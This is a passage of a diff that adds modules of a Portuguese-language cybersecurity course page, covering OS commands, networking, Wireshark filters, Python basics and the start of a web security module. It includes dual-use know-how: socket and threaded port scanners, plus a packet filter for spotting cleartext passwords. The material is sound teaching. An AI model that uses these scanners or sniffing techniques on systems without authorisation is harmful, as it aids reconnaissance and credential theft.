+              <tr><td><code>ipconfig</code></td><td>Mostra os adaptadores de rede, IP local, máscara de sub-rede e gateway da máquina</td></tr>
+              <tr><td><code>ping &lt;host&gt;</code></td><td>Envia pacotes ICMP para testar se o host responde e medir a latência</td></tr>
+              <tr><td><code>netstat -an</code></td><td>Lista todas (<code>-a</code>) as conexões de rede ativas mostrando endereços numéricos (<code>-n</code>), útil para achar portas abertas ou conexões suspeitas</td></tr>
+              <tr><td><code>net user</code></td><td>Lista as contas de usuário cadastradas no sistema (relevante para auditoria de contas)</td></tr>
+              <tr><td><code>tasklist</code></td><td>Lista todos os processos em execução com seus PIDs (Process IDs)</td></tr>
+              <tr><td><code>taskkill /PID &lt;id&gt; /F</code></td><td>Encerra à força (<code>/F</code>) o processo com o PID informado — use com cuidado, sem confirmação</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>3.1 Windows — PowerShell</h3>
+        <pre data-lang="powershell"><code class="language-powershell"># Listar processos
+Get-Process
+
+# Listar servicos
+Get-Service
+
+# Ver informacoes de rede
+Get-NetIPAddress
+
+# Testar conexao
+Test-Connection -ComputerName google.com -Count 4
+
+# Listar arquivos
+Get-ChildItem -Path C:\Users
+
+# Filtrar processos por nome
+Get-Process | Where-Object {$_.ProcessName -like "chrome*"}
+
+# Ver historico de comandos
+Get-History</code></pre>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Comando</th><th>O que faz</th></tr></thead>
+            <tbody>
+              <tr><td><code>Get-Process</code></td><td>Lista todos os processos em execução com uso de CPU e memória (equivalente ao <code>ps aux</code> do Linux)</td></tr>
+              <tr><td><code>Get-Service</code></td><td>Lista os serviços do Windows e seu status (Running/Stopped) — útil para identificar serviços indevidamente ativos</td></tr>
+              <tr><td><code>Get-NetIPAddress</code></td><td>Mostra os endereços IP configurados em cada interface de rede</td></tr>
+              <tr><td><code>Test-Connection -ComputerName &lt;host&gt; -Count 4</code></td><td>Equivalente ao <code>ping</code>; <code>-ComputerName</code> define o alvo e <code>-Count</code> quantos pacotes ICMP enviar</td></tr>
+              <tr><td><code>Get-ChildItem -Path &lt;caminho&gt;</code></td><td>Lista arquivos e pastas do caminho informado (alias: <code>ls</code>, <code>dir</code> também funcionam no PowerShell)</td></tr>
+              <tr><td><code>Get-Process &#124; Where-Object {...}</code></td><td>O pipe (<code>&#124;</code>) envia a saída de <code>Get-Process</code> para <code>Where-Object</code>, que filtra usando a condição entre chaves — aqui, processos cujo nome comece com "chrome"</td></tr>
+              <tr><td><code>Get-History</code></td><td>Mostra os últimos comandos executados na sessão atual — útil em investigação forense de uma máquina comprometida</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>3.2 Linux — Estrutura de Diretorios</h3>
+        <pre data-lang="bash"><code class="language-bash">/           -> Raiz do sistema
+/bin        -> Binarios essenciais
+/boot       -> Arquivos de inicializacao
+/dev        -> Dispositivos de hardware
+/etc        -> Arquivos de configuracao
+/home       -> Diretorios dos usuarios
+/lib        -> Bibliotecas compartilhadas
+/media      -> Midias removiveis
+/mnt        -> Pontos de montagem
+/opt        -> Softwares opcionais
+/proc       -> Informacoes de processos
+/root       -> Home do usuario root
+/sbin       -> Binarios do sistema
+/tmp        -> Arquivos temporarios
+/usr        -> Programas do usuario
+/var        -> Dados variaveis (logs, etc.)</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>3.2 Linux — Comandos Essenciais</h3>
+        <pre data-lang="bash"><code class="language-bash"># ============================================
+# NAVEGACAO
+# ============================================
+pwd              # "print working directory": exibe o caminho absoluto de onde voce esta
+ls -la           # -l = formato longo (permissoes, dono, tamanho, data)
+                 # -a = mostra tambem arquivos ocultos (que comecam com ".")
+cd /var/log      # muda o diretorio de trabalho; "cd .." sobe um nivel, "cd ~" vai para o home
+
+# ============================================
+# MANIPULACAO DE ARQUIVOS
+# ============================================
+touch arquivo.txt     # cria um arquivo vazio (ou atualiza a data de modificacao se ja existir)
+mkdir pasta           # cria um diretorio novo; use "mkdir -p a/b/c" para criar toda a arvore de uma vez
+cp origem destino     # copia arquivo/pasta; use "-r" para copiar diretorios recursivamente
+mv origem destino     # move OU renomeia (no Linux, renomear = mover para o mesmo lugar com outro nome)
+rm arquivo.txt        # remove um arquivo (sem lixeira — e definitivo)
+rm -rf pasta/         # -r = recursivo (entra em subpastas), -f = forca sem pedir confirmacao (CUIDADO!)
+cat arquivo.txt       # concatena e imprime o conteudo inteiro do arquivo na tela
+head -n 10 arquivo    # -n 10 = mostra apenas as 10 primeiras linhas (padrao seria 10 mesmo sem -n)
+tail -n 20 arquivo    # mostra as 20 ultimas linhas; "tail -f arquivo" acompanha o arquivo em tempo real
+grep "erro" log.txt   # busca a palavra "erro" dentro do arquivo e imprime as linhas que combinam
+
+# ============================================
+# PERMISSOES
+# ============================================
+chmod 755 script.sh   # altera as permissoes do arquivo para o valor octal informado (ver tabela abaixo)
+chown user:group file # troca o dono (user) e o grupo (group) do arquivo/pasta
+ls -la                # a primeira coluna do "ls -la" mostra as permissoes no formato rwxrwxrwx
+
+# r = read (4), w = write (2), x = execute (1) — os valores se somam por bloco
+# 755 = rwxr-xr-x (dono: le+escreve+executa=7, grupo: le+executa=5, outros: le+executa=5)
+
+# ============================================
+# PROCESSOS
+# ============================================
+ps aux                # a = todos os processos, u = formato com usuario dono, x = inclui processos sem terminal
+top                   # monitor interativo em tempo real de CPU/memoria por processo (pressione "q" para sair)
+kill -9 PID           # -9 = sinal SIGKILL, forca o encerramento imediato do processo pelo numero de PID
+systemctl status ssh  # mostra se o servico "ssh" esta ativo (active/running), parado ou com erro
+
+# ============================================
+# REDE
+# ============================================
+ip addr               # lista interfaces de rede e seus enderecos IP (substitui o antigo "ifconfig")
+ping -c 4 google.com  # -c 4 = envia exatamente 4 pacotes ICMP e para (sem isso, o ping roda para sempre)
+netstat -tulpn        # t=TCP, u=UDP, l=apenas portas em escuta (listening), p=mostra o PID/programa, n=numerico (sem resolver DNS)
+ss -tulpn             # mesma ideia do netstat, porem mais rapido e moderno (usa a mesma sintaxe de flags)
+curl -I https://site.com  # -I = pede apenas os headers HTTP (HEAD request), sem baixar o corpo da pagina
+wget https://site.com/arquivo.zip  # baixa o arquivo da URL e salva no diretorio atual
+ssh user@192.168.1.10  # abre uma sessao de terminal remota autenticando como "user" no host informado
+
+# ============================================
+# LOGS E SISTEMA
+# ============================================
+journalctl -xe        # -x = adiciona contexto explicativo aos eventos, -e = pula direto para o final do log
+cat /var/log/syslog   # exibe o log geral do sistema (em distros baseadas em systemd, prefira "journalctl")
+df -h                 # "disk free": espaco em disco por particao; -h = valores legiveis (GB/MB em vez de blocos)
+free -h               # memoria RAM total, usada e livre; -h = valores legiveis (GB/MB)
+du -sh /pasta         # "disk usage": -s = resume em um total (nao lista cada arquivo), -h = valores legiveis</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>3.2 Linux — Bash Scripting Basico</h3>
+        <pre data-lang="bash"><code class="language-bash">#!/bin/bash
+# A linha acima e o "shebang": diz ao sistema qual interpretador usar para rodar o script
+
+echo "=== Scanner de Ping ==="
+
+# $1 e o primeiro argumento passado na linha de comando (ex: ./script.sh 8.8.8.8 -> $1 = "8.8.8.8")
+# -z "$1" testa se a string esta vazia (ou seja, se nenhum argumento foi passado)
+if [ -z "$1" ]; then
+    echo "Uso: $0 &lt;IP&gt;"   # $0 e o nome do proprio script
+    exit 1                # encerra o script com codigo de erro 1 (qualquer valor != 0 = falha)
+fi
+
+IP="$1"   # guarda o argumento numa variavel com nome mais claro
+
+# -c 1  = envia apenas 1 pacote ICMP
+# -W 2  = espera no maximo 2 segundos por resposta antes de desistir
+# > /dev/null 2>&1  = descarta toda a saida (stdout e stderr), so nos interessa se o comando teve sucesso
+# O "if" aqui testa o CODIGO DE SAIDA do ping: 0 = sucesso (respondeu), != 0 = falhou
+if ping -c 1 -W 2 "$IP" &gt; /dev/null 2&gt;&amp;1; then
+    echo "[ONLINE] $IP esta respondendo"
+else
+    echo "[OFFLINE] $IP nao responde"
+fi</code></pre>
+        <pre data-lang="bash"><code class="language-bash">#!/bin/bash
+# Script de backup automatizado
+
+DATA=$(date +%Y%m%d_%H%M%S)   # $(...) executa o comando "date" e guarda a saida formatada na variavel
+ORIGEM="/home/usuario/documentos"
+DESTINO="/backup/documentos_$DATA.tar.gz"   # interpolacao: o valor de $DATA entra no meio da string
+
+echo "Iniciando backup em $DATA..."
+
+# tar cria um arquivo compactado a partir da pasta de ORIGEM
+# c = create (criar novo arquivo), z = compress com gzip, f = f de "file" (nome do arquivo de saida vem a seguir)
+# 2>/dev/null descarta apenas mensagens de erro (stderr), mantendo a saida normal visivel
+tar -czf "$DESTINO" "$ORIGEM" 2&gt;/dev/null
+
+# $? guarda o codigo de saida do ULTIMO comando executado (aqui, o tar)
+# -eq 0 verifica se esse codigo e igual a 0 (sucesso)
+if [ $? -eq 0 ]; then
+    echo "Backup concluido: $DESTINO"
+else
+    echo "Erro no backup!"
+fi</code></pre>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="03"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 04 -->
+    <section class="section" id="mod04" data-mod="04">
+      <div class="section-header">
+        <h2>Módulo 04 — Redes de Computadores</h2>
+        <span class="section-tag">Iniciante</span>
+        <span class="est-time">~50 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="04">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>4.1 Modelo OSI (7 Camadas)</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Camada</th><th>Nome</th><th>Funcao</th><th>Exemplos</th></tr></thead>
+            <tbody>
+              <tr><td>7</td><td>Aplicacao</td><td>Interface com usuario</td><td>HTTP, FTP, SMTP, DNS</td></tr>
+              <tr><td>6</td><td>Apresentacao</td><td>Formatacao de dados</td><td>SSL/TLS, JPEG, ASCII</td></tr>
+              <tr><td>5</td><td>Sessao</td><td>Gerenciamento de sessoes</td><td>NetBIOS, RPC</td></tr>
+              <tr><td>4</td><td>Transporte</td><td>Entrega confiavel de dados</td><td>TCP, UDP</td></tr>
+              <tr><td>3</td><td>Rede</td><td>Enderecamento e roteamento</td><td>IP, ICMP, OSPF</td></tr>
+              <tr><td>2</td><td>Enlace de Dados</td><td>Transmissao entre nos</td><td>Ethernet, Wi-Fi (802.11), ARP</td></tr>
+              <tr><td>1</td><td>Fisica</td><td>Sinais eletricos/opticos</td><td>Cabos, hubs, switches</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>4.2 Modelo TCP/IP (4 Camadas)</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Camada</th><th>Protocolos</th></tr></thead>
+            <tbody>
+              <tr><td>Aplicacao</td><td>HTTP, HTTPS, FTP, SSH, DNS, DHCP</td></tr>
+              <tr><td>Transporte</td><td>TCP, UDP</td></tr>
+              <tr><td>Internet</td><td>IP, ICMP, ARP</td></tr>
+              <tr><td>Acesso a Rede</td><td>Ethernet, Wi-Fi</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>4.3 Enderecamento IP</h3>
+        <p><strong>IPv4</strong> — 32 bits, formato decimal pontuado: 192.168.1.1. Classes de rede: A, B, C, D (multicast), E (experimental). Enderecos privados: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16</p>
+        <p><strong>IPv6</strong> — 128 bits, formato hexadecimal: 2001:0db8:85a3::8a2e:0370:7334. Espaco de enderecamento muito maior. Nativamente mais seguro (IPsec integrado).</p>
+        <p><strong>Mascara de Sub-rede e CIDR</strong></p>
+        <pre data-lang="bash"><code class="language-bash">192.168.1.0/24  ->  256 IPs (254 hosts)
+192.168.1.0/16  ->  65.536 IPs
+10.0.0.0/8      ->  16.777.216 IPs</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>4.4 Protocolos Essenciais — TCP vs UDP</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Caracteristica</th><th>TCP</th><th>UDP</th></tr></thead>
+            <tbody>
+              <tr><td>Confiabilidade</td><td>Alta (confirma entrega)</td><td>Baixa (sem confirmacao)</td></tr>
+              <tr><td>Velocidade</td><td>Mais lento</td><td>Mais rapido</td></tr>
+              <tr><td>Ordem</td><td>Mantem ordem dos pacotes</td><td>Nao garante ordem</td></tr>
+              <tr><td>Uso</td><td>HTTP, FTP, SSH</td><td>DNS, streaming, jogos</td></tr>
+              <tr><td>Handshake</td><td>3-way handshake</td><td>Sem handshake</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>4.4 Portas Comuns</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Porta</th><th>Protocolo</th><th>Servico</th></tr></thead>
+            <tbody>
+              <tr><td>20/21</td><td>TCP</td><td>FTP</td></tr>
+              <tr><td>22</td><td>TCP</td><td>SSH</td></tr>
+              <tr><td>23</td><td>TCP</td><td>Telnet (inseguro!)</td></tr>
+              <tr><td>25</td><td>TCP</td><td>SMTP</td></tr>
+              <tr><td>53</td><td>TCP/UDP</td><td>DNS</td></tr>
+              <tr><td>80</td><td>TCP</td><td>HTTP</td></tr>
+              <tr><td>110</td><td>TCP</td><td>POP3</td></tr>
+              <tr><td>143</td><td>TCP</td><td>IMAP</td></tr>
+              <tr><td>443</td><td>TCP</td><td>HTTPS</td></tr>
+              <tr><td>3306</td><td>TCP</td><td>MySQL</td></tr>
+              <tr><td>3389</td><td>TCP</td><td>RDP</td></tr>
+              <tr><td>5432</td><td>TCP</td><td>PostgreSQL</td></tr>
+              <tr><td>8080</td><td>TCP</td><td>Proxy/Alternativa HTTP</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>4.5 DNS, DHCP, VPN</h3>
+        <p><strong>DNS</strong> — Traduz nomes de dominio em IPs:</p>
+        <pre data-lang="fluxo"><code>usuario -> google.com -> DNS -> 142.250.80.46</code></pre>
+        <p><strong>DHCP</strong> — Atribui IPs automaticamente a rede:</p>
+        <pre data-lang="fluxo"><code>Dispositivo -> Solicita IP -> DHCP Server -> Atribui IP + Gateway + DNS</code></pre>
+        <p><strong>VPN</strong> — Cria tunel criptografado sobre rede publica. Site-to-Site conecta duas redes corporativas. Remote Access: usuario individual acessa rede corporativa. Protocolos: OpenVPN, WireGuard, IPSec, L2TP.</p>
+      </div>
+
+      <div class="card">
+        <h3>4.6 Wireshark — Analise de Pacotes</h3>
+        <pre data-lang="wireshark"><code>ip.addr == 192.168.1.1          # Filtrar por IP
+tcp.port == 80                  # Filtrar por porta
+dns                             # Apenas DNS
+http.request.method == "POST"   # Apenas POSTs HTTP
+ssl.handshake.type == 1         # Client Hello (TLS)
+icmp                            # Apenas ping
+frame contains "password"       # Busca texto no payload</code></pre>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Filtro</th><th>O que faz</th></tr></thead>
+            <tbody>
+              <tr><td><code>ip.addr == &lt;ip&gt;</code></td><td>Mostra apenas pacotes onde o IP informado aparece como origem OU destino</td></tr>
+              <tr><td><code>tcp.port == &lt;porta&gt;</code></td><td>Filtra pacotes TCP que usam a porta informada (origem ou destino)</td></tr>
+              <tr><td><code>dns</code></td><td>Mostra apenas o tráfego do protocolo DNS (consultas e respostas de resolução de nomes)</td></tr>
+              <tr><td><code>http.request.method == "POST"</code></td><td>Filtra apenas requisições HTTP do tipo POST (útil para achar envios de formulários/login)</td></tr>
+              <tr><td><code>ssl.handshake.type == 1</code></td><td>Mostra apenas o pacote "Client Hello", o primeiro passo do handshake TLS, que revela qual site o cliente está tentando acessar (via SNI)</td></tr>
+              <tr><td><code>icmp</code></td><td>Mostra apenas pacotes ICMP (usados por ping/traceroute)</td></tr>
+              <tr><td><code>frame contains "password"</code></td><td>Busca a string literal "password" em qualquer parte do pacote — útil para achar credenciais trafegando em texto claro (HTTP sem TLS)</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="04"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 05 -->
+    <section class="section" id="mod05" data-mod="05">
+      <div class="section-header">
+        <h2>Módulo 05 — Programacao para Seguranca</h2>
+        <span class="section-tag">Intermediario</span>
+        <span class="est-time">~20 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="05">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>5.1 Por que programar em Seguranca?</h3>
+        <ul class="content-list">
+          <li>Automatizar tarefas repetitivas</li>
+          <li>Criar ferramentas personalizadas</li>
+          <li>Entender como exploits funcionam</li>
+          <li>Analisar malware</li>
+          <li>Desenvolver scripts de defesa</li>
+        </ul>
+      </div>
+
+      <div class="card">
+        <h3>5.2 Linguagens Principais</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Linguagem</th><th>Uso em Seguranca</th></tr></thead>
+            <tbody>
+              <tr><td>Python</td><td>Automacao, pentest, analise de dados</td></tr>
+              <tr><td>Bash</td><td>Scripts Linux, automacao de sistemas</td></tr>
+              <tr><td>SQL</td><td>Bancos de dados, injecao SQL</td></tr>
+              <tr><td>JavaScript</td><td>Seguranca web, XSS, analise de front-end</td></tr>
+              <tr><td>C/C++</td><td>Desenvolvimento de exploits, engenharia reversa</td></tr>
+              <tr><td>PowerShell</td><td>Windows, Red Team, post-exploitation</td></tr>
+              <tr><td>Go</td><td>Ferramentas de seguranca modernas</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="05"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 06 -->
+    <section class="section" id="mod06" data-mod="06">
+      <div class="section-header">
+        <h2>Módulo 06 — Python Completo para Seguranca</h2>
+        <span class="section-tag">Intermediario</span>
+        <span class="est-time">~90 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="06">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>6.1 Fundamentos de Python</h3>
+        <pre data-lang="python"><code class="language-python"># ============================================
+# VARIAVEIS E TIPOS DE DADOS
+# ============================================
+
+nome = "Ana Silva"          # string
+idade = 25                  # int
+altura = 1.68               # float
+ativo = True                # bool
+lista_ips = ["192.168.1.1", "10.0.0.1"]   # list
+dados = {"ip": "192.168.1.1", "porta": 80} # dict
+
+# ============================================
+# CONDICOES
+# ============================================
+
+senha = input("Digite a senha: ")
+
+if len(senha) >= 12:
+    print("Senha forte!")
+elif len(senha) >= 8:
+    print("Senha media. Adicione simbolos.")
+else:
+    print("Senha fraca! Minimo 8 caracteres.")
+
+# ============================================
+# LACOS
+# ============================================
+
+# For - iterar sobre lista
+portas_comuns = [21, 22, 23, 25, 80, 443, 3306, 8080]
+for porta in portas_comuns:
+    print(f"Verificando porta {porta}")
+
+# While - repetir ate condicao
+contador = 0
+while contador < 3:
+    print(f"Tentativa {contador + 1}")
+    contador += 1
+
+# ============================================
+# FUNCOES
+# ============================================
+
+def verificar_forca_senha(senha):
+    """Avalia a forca de uma senha."""
+    pontos = 0
+    if len(senha) >= 12: pontos += 1
+    if any(c.isupper() for c in senha): pontos += 1
+    if any(c.islower() for c in senha): pontos += 1
+    if any(c.isdigit() for c in senha): pontos += 1
+    if any(c in "!@#$%^&*" for c in senha): pontos += 1
+
+    niveis = {0: "Muito Fraca", 1: "Fraca", 2: "Media",
+              3: "Boa", 4: "Forte", 5: "Muito Forte"}
+    return niveis.get(pontos, "Fraca")
+
+print(verificar_forca_senha("P@ssw0rd123!"))
+
+# ============================================
+# LISTAS E DICIONARIOS
+# ============================================
+
+# Lista de logs
+logs = ["192.168.1.1 - GET /admin", "10.0.0.5 - POST /login"]
+logs.append("172.16.0.1 - GET /config")
+
+# Dicionario de configuracao
+config = {
+    "host": "192.168.1.1",
+    "portas": [22, 80, 443],
+    "timeout": 5,
+    "verbose": True
+}
+print(config["host"])
+
+# ============================================
+# MANIPULACAO DE ARQUIVOS
+# ============================================
+
+# Ler arquivo
+with open("senhas.txt", "r") as f:
+    linhas = f.readlines()
+    for linha in linhas:
+        print(linha.strip())
+
+# Escrever arquivo (log)
+with open("scan_result.txt", "w") as f:
+    f.write("Porta 80: ABERTA\n")
+    f.write("Porta 443: ABERTA\n")
+
+# JSON
+import json
+with open("config.json", "w") as f:
+    json.dump(config, f, indent=4)
+
+# CSV
+import csv
+with open("relatorio.csv", "w", newline="") as f:
+    writer = csv.writer(f)
+    writer.writerow(["IP", "Porta", "Status"])
+    writer.writerow(["192.168.1.1", 80, "Aberta"])</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>6.2 Python para Redes e Sockets</h3>
+        <pre data-lang="python"><code class="language-python">import socket
+
+# ============================================
+# RESOLVER NOME PARA IP (DNS)
+# ============================================
+
+def resolver_dns(dominio):
+    try:
+        ip = socket.gethostbyname(dominio)
+        print(f"{dominio} -> {ip}")
+        return ip
+    except socket.gaierror:
+        print(f"Nao foi possivel resolver {dominio}")
+        return None
+
+resolver_dns("google.com")
+
+# ============================================
+# SCANNER DE PORTAS SIMPLES
+# ============================================
+
+def scan_porta(ip, porta):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(1)
+    resultado = s.connect_ex((ip, porta))
+    s.close()
+    return resultado == 0
+
+# Scan de portas comuns
+alvo = "127.0.0.1"
+portas = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 8080]
+
+print(f"Scanning {alvo}...")
+for porta in portas:
+    if scan_porta(alvo, porta):
+        print(f"[ABERTA] Porta {porta}")
+    else:
+        print(f"[FECHADA] Porta {porta}")
+
+# ============================================
+# SCANNER DE PORTAS COMPLETO (1-1024)
+# ============================================
+
+def scan_completo(ip, inicio=1, fim=1024):
+    abertas = []
+    print(f"Iniciando scan em {ip} (portas {inicio}-{fim})...")
+
+    for porta in range(inicio, fim + 1):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.5)
+        resultado = s.connect_ex((ip, porta))
+        s.close()
+
+        if resultado == 0:
+            abertas.append(porta)
+            print(f"[+] Porta {porta} ABERTA")
+
+    return abertas
+
+# Descomente para executar:
+# scan_completo("192.168.1.1")</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>6.3 Python para Criptografia</h3>
+        <pre data-lang="python"><code class="language-python">import hashlib
+import secrets
+import string
+from cryptography.fernet import Fernet
+
+# ============================================
+# HASHES (Unidirecional)
+# ============================================
+
+def gerar_hash(texto, algoritmo="sha256"):
+    """Gera hash de um texto."""
+    if algoritmo == "md5":
+        return hashlib.md5(texto.encode()).hexdigest()
+    elif algoritmo == "sha1":
+        return hashlib.sha1(texto.encode()).hexdigest()
+    elif algoritmo == "sha256":
+        return hashlib.sha256(texto.encode()).hexdigest()
+    elif algoritmo == "sha512":
+        return hashlib.sha512(texto.encode()).hexdigest()
+
+senha = "MinhaSenhaSegura123!"
+print(f"MD5:    {gerar_hash(senha, 'md5')}")
+print(f"SHA256: {gerar_hash(senha, 'sha256')}")
+print(f"SHA512: {gerar_hash(senha, 'sha512')}")
+
+# ============================================
+# GERADOR DE SENHAS SEGURAS
+# ============================================
+
+def gerar_senha(tamanho=20):
+    """Gera senha forte usando secrets (criptograficamente seguro)."""
+    caracteres = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
+    return "".join(secrets.choice(caracteres) for _ in range(tamanho))
+
+print(f"Senha gerada: {gerar_senha(20)}")
+
+# ============================================
+# CRIPTOGRAFIA SIMETRICA (AES via Fernet)
+# ============================================
+
+# Gerar chave
+chave = Fernet.generate_key()
+fernet = Fernet(chave)
+
+mensagem = "Dados confidenciais do cliente".encode()
+
+# Criptografar
+mensagem_cifrada = fernet.encrypt(mensagem)
+print(f"Cifrado: {mensagem_cifrada}")
+
+# Descriptografar
+mensagem_decifrada = fernet.decrypt(mensagem_cifrada)
+print(f"Decifrado: {mensagem_decifrada.decode()}")
+
+# Salvar chave
+with open("chave_secreta.key", "wb") as f:
+    f.write(chave)</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>6.4 Python para Web e APIs</h3>
+        <pre data-lang="python"><code class="language-python">import requests
+import json
+
+# ============================================
+# CONSUMINDO API (GET)
+# ============================================
+
+resposta = requests.get("https://api.github.com")
+print(f"Status: {resposta.status_code}")
+print(json.dumps(resposta.json(), indent=2))
+
+# ============================================
+# VERIFICAR HEADERS DE SEGURANCA
+# ============================================
+
+def verificar_headers_seguranca(url):
+    """Verifica headers de seguranca de um site."""
+    try:
+        r = requests.get(url, timeout=5)
+        headers = r.headers
+
+        checks = {
+            "Strict-Transport-Security": headers.get("Strict-Transport-Security", "AUSENTE"),
+            "Content-Security-Policy": headers.get("Content-Security-Policy", "AUSENTE"),
+            "X-Frame-Options": headers.get("X-Frame-Options", "AUSENTE"),
+            "X-Content-Type-Options": headers.get("X-Content-Type-Options", "AUSENTE"),
+            "Referrer-Policy": headers.get("Referrer-Policy", "AUSENTE"),
+        }
+
+        print(f"\nAnalise de Headers: {url}\n")
+        for header, valor in checks.items():
+            status = "OK" if valor != "AUSENTE" else "FALTA"
+            print(f"{status} | {header}: {valor}")
+
+    except requests.RequestException as e:
+        print(f"Erro: {e}")
+
+verificar_headers_seguranca("https://google.com")
+
+# ============================================
+# WEB SCRAPING BASICO
+# ============================================
+
+from bs4 import BeautifulSoup
+
+r = requests.get("https://quotes.toscrape.com/")
+soup = BeautifulSoup(r.text, "html.parser")
+
+citacoes = soup.find_all("span", class_="text")
+for i, c in enumerate(citacoes[:5], 1):
+    print(f"{i}. {c.text}")</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>6.5 Python para Automacao e Threads</h3>
+        <pre data-lang="python"><code class="language-python">import threading
+import time
+import socket
+
+# ============================================
+# SCANNER DE PORTAS COM THREADS (MAIS RAPIDO)
+# ============================================
+
+resultados = []
+lock = threading.Lock()
+
+def scan_thread(ip, porta):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(1)
+    resultado = s.connect_ex((ip, porta))
+    s.close()
+
+    if resultado == 0:
+        with lock:
+            resultados.append(porta)
+            print(f"[+] Porta {porta} ABERTA")
+
+def scan_multi_thread(ip, portas, max_threads=100):
+    threads = []
+    for porta in portas:
+        while threading.active_count() > max_threads:
+            time.sleep(0.1)
+        t = threading.Thread(target=scan_thread, args=(ip, porta))
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
+
+    return sorted(resultados)
+
+# Uso:
+# portas = range(1, 1025)
+# abertas = scan_multi_thread("192.168.1.1", portas)</code></pre>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="06"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 07 -->
+    <section class="section" id="mod07" data-mod="07">
+      <div class="section-header">
+        <h2>Módulo 07 — Seguranca Web</h2>
+        <span class="section-tag">Intermediario</span>
+        <span class="est-time">~55 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="07">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>7.1 Fundamentos Web — HTML, CSS, JavaScript</h3>
+        <pre data-lang="html"><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Login Seguro&lt;/title&gt;
+    &lt;style&gt;
+        body { font-family: Arial; background: #1a1a2e; color: white; }
+        .container { max-width: 400px; margin: 50px auto; padding: 20px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; }
+        button { background: #e94560; color: white; padding: 12px; border: none; }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container"&gt;
+        &lt;h2&gt;Login&lt;/h2&gt;
+        &lt;input type="text" id="usuario" placeholder="Usuario"&gt;
+        &lt;input type="password" id="senha" placeholder="Senha"&gt;
+        &lt;button onclick="login()"&gt;Entrar&lt;/button&gt;
+        &lt;p id="msg"&gt;&lt;/p&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        function login() {
+            const user = document.getElementById("usuario").value;
+            const pass = document.getElementById("senha").value;
+
+            if (pass.length &lt; 8) {
+                document.getElementById("msg").innerText = "Senha muito curta!";
+                return;
+            }
+
+            fetch("/api/login", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({usuario: user, senha: pass})
+            })
+            .then(r =&gt; r.json())
+            .then(data =&gt; {
+                if (data.token) {
+                    localStorage.setItem("jwt", data.token);
+                    window.location.href = "/dashboard";
+                } else {
+                    document.getElementById("msg").innerText = "Login invalido";
+                }
+            });
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>7.2 OWASP TOP 10 (2021)</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Rank</th><th>Vulnerabilidade</th><th>Descricao</th></tr></thead>
+            <tbody>
+              <tr><td>A01</td><td>Broken Access Control</td><td>Acesso indevido a recursos restritos</td></tr>
+              <tr><td>A02</td><td>Cryptographic Failures</td><td>Falhas em criptografia de dados sensiveis</td></tr>
+              <tr><td>A03</td><td>Injection</td><td>SQL, NoSQL, OS command, LDAP injection</td></tr>
